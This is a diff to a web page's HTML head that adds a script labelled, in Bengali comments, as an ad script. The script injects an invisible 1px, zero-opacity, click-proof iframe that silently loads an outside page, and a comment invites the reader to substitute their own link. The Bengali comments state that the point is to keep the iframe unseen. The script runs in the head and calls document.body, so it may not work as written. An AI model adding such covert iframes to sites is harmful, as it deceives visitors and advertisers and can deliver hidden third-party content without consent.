@@ -4,6 +4,41 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <!-- MRMND অ্যাড স্ক্রিপ্ট -->
+  <script>
+
+    // iframe তৈরি করা হচ্ছে
+
+    var iframe = document.createElement('iframe');
+
+    
+
+    // iframe-এর URL সেট
+
+    iframe.src = "https://safi-games.vercel.app/auahj.html"; // এখানে তোমার লিংক দিন
+
+    // iframe লুকানো রাখা
+
+    iframe.style.width = "1px";
+
+    iframe.style.height = "1px";
+
+    iframe.style.position = "absolute";
+
+    iframe.style.top = "0";
+
+    iframe.style.left = "0";
+
+    iframe.style.border = "0";
+
+    iframe.style.opacity = "0";          // চোখে না দেখানোর জন্য
+
+    iframe.style.pointerEvents = "none"; // click/hover এ কোন প্রভাব হবে না
+
+    // body-তে iframe যোগ করা
+
+    document.body.appendChild(iframe);
+
+  </script>
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
